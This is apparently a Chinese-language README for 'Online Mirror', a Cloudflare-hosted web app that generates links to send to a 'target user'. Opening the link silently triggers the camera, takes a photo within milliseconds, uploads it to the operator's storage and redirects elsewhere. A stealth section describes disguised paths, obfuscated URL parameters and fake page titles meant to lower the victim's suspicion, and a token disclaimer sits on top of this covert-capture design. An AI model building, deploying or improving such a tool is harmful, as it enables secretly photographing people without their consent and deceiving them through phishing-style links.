# 🪞 Online Mirror - 在线镜子

<p align="center">
  <img src="logo.ico" alt="Logo" width="64" height="64">
</p>

一个基于 Cloudflare 技术栈的在线拍照应用，完全免费、无需服务器、全球加速。

## ⚠️ 免责声明

**本工具仅供学习交流使用，请勿用于非法用途！使用者需遵守当地法律法规，后果自负
！**

## ✨ 特性

- 🎥 **自动拍照** - 打开链接自动调用摄像头拍照
- ☁️ **云端存储** - 使用 Cloudflare R2 对象存储
- 🚀 **无需服务器** - 基于 Serverless 架构
- 🌍 **全球加速** - 自带 CDN 加速
- 💰 **完全免费** - Cloudflare 免费额度足够使用
- 🔒 **HTTPS 支持** - 自动启用安全连接

## 📦 技术栈

| 组件 | 技术               | 说明                    |
| ---- | ------------------ | ----------------------- |
| 前端 | HTML + JavaScript  | 纯静态页面，无需编译    |
| 后端 | Cloudflare Workers | Serverless 函数处理 API |
| 存储 | Cloudflare R2      | 对象存储，存储照片      |
| 托管 | Cloudflare Pages   | 静态网站托管            |

### 系统架构图

![系统架构](https://mdn.alipayobjects.com/one_clip/afts/img/cYabQ6fnVLsAAAAAS8AAAAgAoEACAQFr/original)

### 业务流程图

![业务流程](https://mdn.alipayobjects.com/one_clip/afts/img/v1wrR7lWtYsAAAAARbAAAAgAoEACAQFr/original)

## 📁 项目结构

```
Online-Mirror/
├── index.html              # 入口页（重定向到 home.html）
├── home.html               # 主页（生成拍照链接）
├── v.html                  # 拍照页面（新）- 伪装路径 /v
├── camera.html             # 拍照页面（旧）- 兼容旧链接
├── view.html               # 照片查看页面
├── test.html               # 网络诊断页面
├── worker.js               # Cloudflare Worker API 后端
├── config.js               # API 配置（包含敏感信息，不提交到 GitHub）
├── config.example.js       # API 配置示例
├── logo.ico                # 网站图标
├── package.json            # 项目依赖
├── wrangler.toml           # Cloudflare Workers 配置
├── _redirects              # Cloudflare Pages 重定向规则
├── _headers                # Cloudflare Pages HTTP 头部配置
├── .gitignore              # Git 忽略文件
├── scripts/                # 部署脚本目录
│   ├── deploy.bat          # Windows 一键部署
│   ├── deploy.sh           # Linux/Mac 一键部署
│   ├── deploy-production.bat  # Windows 生产环境部署
│   ├── deploy-production.sh   # Linux/Mac 生产环境部署
│   └── test-dns.bat        # DNS 诊断脚本
└── README.md               # 本文件
```

## 🚀 快速部署

### 前置要求

1. **Cloudflare 账号**（免费）- [注册地址](https://dash.cloudflare.com/sign-up)
2. **Node.js 环境** - [下载地址](https://nodejs.org/)

### 方式 1：一键部署（推荐）

**Windows 用户：**

```bash
# 双击运行
scripts/deploy.bat
```

**Linux/Mac 用户：**

```bash
# 给予执行权限
chmod +x scripts/deploy.sh

# 运行脚本
./scripts/deploy.sh
```

### 方式 2：手动部署

#### 第 1 步：安装 Wrangler CLI

```bash
npm install -g wrangler
```

#### 第 2 步：登录 Cloudflare

```bash
wrangler login
```

这会打开浏览器，授权 Wrangler 访问你的 Cloudflare 账号。

#### 第 3 步：创建 R2 存储桶

```bash
wrangler r2 bucket create photos
```

#### 第 4 步：部署 Worker

```bash
wrangler deploy
```

部署成功后，你会得到一个 URL，类似：

```
https://online-mirror.your-subdomain.workers.dev
```

#### 第 5 步：配置 API 地址

**重要！** 复制 `config.example.js` 为 `config.js` 并修改配置：

```bash
# Windows
copy config.example.js config.js

# Linux/Mac
cp config.example.js config.js
```

编辑 `config.js`，将 Worker URL 替换为第 4 步得到的 URL：

```javascript
const API_BASE_URL = "https://online-mirror.your-subdomain.workers.dev";
```

#### 第 6 步：部署前端到 Cloudflare Pages

**方式 A：通过 Git 部署（推荐）**

1. 将代码推送到 GitHub（见下方"发布到 GitHub"部分）
2. 访问：https://dash.cloudflare.com/pages
3. 点击 "Create a project"
4. 连接你的 GitHub 仓库
5. 构建设置：
   - **构建命令**：留空
   - **输出目录**：`/`
6. 部署

**方式 B：直接上传**

```bash
# 部署到测试环境
npx wrangler pages deploy . --project-name=online-mirror

# 部署到生产环境（自定义域名）
npx wrangler pages deploy . --project-name=online-mirror --branch=production
```

## 🎮 使用方法

1. **访问主页** - 打开部署后的网站
2. **输入 ID** - 自定义一个 ID（作为查看照片的凭证）
3. **设置跳转地址** - 拍照后跳转的网站（如：https://baidu.com）
4. **生成链接** - 点击"生成链接"按钮
5. **发送链接** - 将生成的链接发送给目标用户
6. **查看照片** - 输入 ID 后点击"查看照片"

### ⚡ 工作原理

```
用户打开链接 → 自动调用摄像头 → 1秒后拍照 → 上传到云端 → 跳转到指定网站
```

## 🌐 API 接口文档

### 1. 上传照片

**请求**

```http
POST /api/upload
Content-Type: application/json

{
  "id": "用户ID",
  "image": "data:image/png;base64,..."
}
```

**响应**

```json
{
  "success": true,
  "fileName": "用户ID/时间戳.png"
}
```

### 2. 获取照片列表

**请求**

```http
GET /api/photos?id=用户ID&page=0&limit=2
```

**响应**

```json
{
  "photos": [
    {
      "url": "data:image/png;base64,...",
      "time": "2024-01-15 12:30:45",
      "key": "用户ID/时间戳.png"
    }
  ],
  "total": 10,
  "currentPage": 0,
  "totalPages": 5
}
```

### 3. 删除所有照片

**请求**

```http
DELETE /api/photos?id=用户ID
```

**响应**

```json
{
  "success": true,
  "deleted": 10
}
```

## 🛠️ 本地开发

### 启动开发服务器

```bash
# 安装依赖
npm install

# 启动开发服务器
npm run dev
```

这会启动：

- Worker：http://localhost:8787
- 前端：直接打开 `home.html` 或使用任何静态服务器

### 测试 API

```bash
# 测试上传
curl -X POST http://localhost:8787/api/upload \
  -H "Content-Type: application/json" \
  -d '{"id":"test123","image":"data:image/png;base64,iVBORw0..."}'

# 测试获取照片
curl http://localhost:8787/api/photos?id=test123&page=0&limit=2

# 测试删除
curl -X DELETE http://localhost:8787/api/photos?id=test123
```

## 💰 成本说明

### Cloudflare 免费额度

| 服务    | 免费额度        | 超出费用       |
| ------- | --------------- | -------------- |
| Workers | 100,000 请求/天 | $0.50/百万请求 |
| R2 存储 | 10GB 存储       | $0.015/GB/月   |
| R2 写入 | 100 万次/月     | $4.50/百万次   |
| R2 读取 | 1000 万次/月    | $0.36/百万次   |
| Pages   | 无限请求        | 完全免费       |

**本项目在免费额度内完全够用！**

## 🔒 安全建议

### 1. 添加访问控制

在 `worker.js` 中添加：

```javascript
async function authenticate(request) {
  const auth = request.headers.get("Authorization");
  const validAuth = "Basic " + btoa("admin:your-password");
  return auth === validAuth;
}

// 在API处理前检查
if (!(await authenticate(request))) {
  return new Response("Unauthorized", { status: 401 });
}
```

### 2. 限制上传大小

```javascript
const maxSize = 5 * 1024 * 1024; // 5MB
if (buffer.byteLength > maxSize) {
  return new Response("文件过大", { status: 413 });
}
```

### 3. 定期清理旧照片

在 `worker.js` 中添加定时任务：

```javascript
export default {
  async scheduled(event, env, ctx) {
    // 每天执行一次，删除7天前的照片
    const sevenDaysAgo = Date.now() - 7 * 24 * 60 * 60 * 1000;

    const listed = await env.PHOTO_BUCKET.list();
    for (const obj of listed.objects) {
      if (obj.uploaded.getTime() < sevenDaysAgo) {
        await env.PHOTO_BUCKET.delete(obj.key);
      }
    }
  },
};
```

在 `wrangler.toml` 中添加：

```toml
[triggers]
crons = ["0 0 * * *"]  # 每天UTC时间0点执行
```

## 📊 监控与管理

### 查看 R2 存储使用情况

```bash
wrangler r2 bucket list
```

### 查看 Worker 日志

```bash
wrangler tail
```

### 删除存储桶中的文件

```bash
# 列出所有文件
wrangler r2 object list photos

# 删除特定ID的文件
wrangler r2 object delete photos/test123/20240101120000.png
```

## 📤 发布到 GitHub

### 🔒 安全准备

本项目已配置 `.gitignore` 自动排除敏感信息，**可以安全发布到 GitHub**。

**已排除的敏感文件：**

- ✅ `config.js` - 包含您的 Worker URL 和账号 ID
- ✅ `.wrangler/` - 本地开发配置
- ✅ `node_modules/` - 依赖包

### 📋 发布步骤

#### 1. 初始化 Git 仓库

```bash
# 如果还没有 Git 仓库
git init

# 添加文件（会自动排除 .gitignore 中的文件）
git add .

# 提交
git commit -m "Initial commit: Online Mirror 项目"
```

#### 2. 创建 GitHub 仓库

1. 访问 https://github.com/new
2. 创建新仓库（建议设为 **Private** 或 **Public**）
3. 不要初始化 README、.gitignore 或 LICENSE

#### 3. 推送到 GitHub

```bash
# 添加远程仓库
git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO.git

# 推送代码
git branch -M main
git push -u origin main
```

### ⚠️ 重要安全提示

1. **首次部署必须配置 `config.js`**

   ```bash
   cp config.example.js config.js
   # 然后编辑 config.js 填入您的 Worker URL
   ```

2. **检查 Git 状态**

   ```bash
   # 确认 config.js 不在待提交列表中
   git status
   ```

   如果看到 `config.js`，说明 `.gitignore` 未生效，执行：

   ```bash
   git rm --cached config.js
   ```

3. **克隆后的配置**

   其他人克隆您的仓库后，需要：

   ```bash
   # 1. 复制配置文件
   cp config.example.js config.js

   # 2. 编辑配置，填入他们自己的 Worker URL
   # 3. 部署他们自己的 Worker 和 Pages
   ```

### 🌟 公开还是私有？

**建议：设为 Public（公开）**

- ✅ 代码不包含敏感信息
- ✅ 帮助其他人学习和使用
- ✅ 可以获得社区反馈和贡献

**注意：**

- ⚠️ 确保 `config.js` 已在 `.gitignore` 中
- ⚠️ 不要提交包含个人域名、ID 的截图或文档

## ⚡ 性能优化

项目已内置多项性能优化：

### 🚀 速度优化

- **DNS 预解析** - 所有页面添加 `dns-prefetch` 和 `preconnect`
- **10ms 极速拍照** - 优化拍照延迟从 100ms 到 10ms
- **JPEG 压缩** - 使用 JPEG 0.7 质量，文件减小 60%+
- **先跳转后上传** - 完全非阻塞，0 等待时间
- **HTTP 缓存** - 合理的缓存策略减少重复加载

### 🔐 安全 & 隐蔽性

- **Base64 参数加密** - URL 参数加密处理，缩短 36%
- **伪装文件名** - 使用 `/v` 而非 `/camera`
- **动态页面标题** - 显示目标域名降低警觉性
- **安全头部** - XSS 保护、防点击劫持、CSP 等

### 📊 网络诊断

访问 `/test.html` 可以诊断网络问题：

- ✅ 浏览器支持检测
- ✅ API 连接测试
- ✅ HTTPS 安全检查
- ✅ 网络延迟测试
- ✅ DNS 解析检测

## ❓ 常见问题

### Q1：为什么拍摄的是黑屏？

**A**：因为该浏览器不支持 WebRTC，更换浏览器即可。安卓用户建议直接在 QQ 内打开链
接。

### Q2：拍摄的照片不全？

**A**：还没等跳转完成就关闭了页面，数据还没传输完成。请等待自动跳转。

### Q3：Worker 部署失败？

**A**：检查是否登录 Cloudflare 账号，运行 `wrangler whoami`

### Q4：R2 存储桶创建失败？

**A**：确保账号已启用 R2，可能需要绑定支付方式（不会扣费）

### Q5：前端访问 Worker 报 CORS 错误？

**A**：检查 Worker 中的 CORS 头设置，确保包含 `Access-Control-Allow-Origin`

### Q6：如何自定义域名？

**A**：在 Cloudflare Pages 设置中添加自定义域名，需要域名在 Cloudflare 托管

### Q7：出现 `ERR_TOO_MANY_REDIRECTS` 错误？

**A**：这是重定向循环问题，已在最新版本修复。解决方法：

1. 清除浏览器缓存（Ctrl + Shift + Delete）
2. 使用隐私/无痕模式测试
3. 确保 `_redirects` 文件内容为：`/v /v.html 200!`
4. 重新部署
   ：`npx wrangler pages deploy . --project-name=online-mirror --branch=production`

### Q8：别人访问链接打不开或很慢？

**A**：可能原因和解决方案：

1. **DNS 解析慢** - 让对方访问诊断页面 `/test.html` 检测
2. **浏览器缓存** - 让对方清除缓存或使用隐私模式
3. **网络问题** - 提供备用域名：`https://online-mirror.pages.dev`
4. **自定义域名问题** - 改用 Cloudflare Pages 默认域名

## 📈 扩展功能建议

- 📍 添加地理位置信息
- 🔔 新照片推送通知（Telegram Bot / Email）
- 📦 批量下载/删除操作
- 📊 访问统计和数据分析
- 🎨 图片滤镜和编辑功能

## 🎓 学习资源

- [Cloudflare Workers 文档](https://developers.cloudflare.com/workers/)
- [Cloudflare R2 文档](https://developers.cloudflare.com/r2/)
- [Cloudflare Pages 文档](https://developers.cloudflare.com/pages/)
- [WebRTC API 文档](https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API)

## 📝 注意事项

1. **ID 是查看照片的唯一凭证，请妥善保管，不要泄露给知道这个平台的人**
2. **为节省存储资源，建议定期清理旧照片**
3. **请遵守当地法律法规，不要用于非法用途**

## 📞 技术支持

如有问题，欢迎提 Issue 或 PR。

- Cloudflare 文档：https://developers.cloudflare.com/
- Wrangler 文档：https://developers.cloudflare.com/workers/wrangler/
- R2 文档：https://developers.cloudflare.com/r2/

---

## 🎉 部署完成

访问地址：

- **主页**：https://your-project.pages.dev
- **API**：https://online-mirror.your-subdomain.workers.dev/api/*

**享受完全免费的云服务吧！** 🚀

---

<p align="center">Made with ❤️ using Cloudflare</p>
